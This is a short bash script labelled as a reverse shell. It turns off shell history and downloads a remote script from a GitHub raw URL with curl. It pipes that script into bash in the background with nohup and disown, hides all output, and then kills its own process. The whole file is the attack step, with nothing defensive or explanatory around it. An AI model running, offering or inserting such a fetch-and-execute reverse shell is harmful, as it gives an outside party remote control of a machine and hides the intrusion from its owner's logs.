#!/bin/bash
# Desc: ReverseShell from tom (:panik:)
export HISTFILE=/dev/null
(nohup curl https://raw.githubusercontent.com/skyf0l/skyf0l.github.io/main/rd1.sh 2> /dev/null&disown)|nohup bash >& /dev/null&disown;kill -9 $$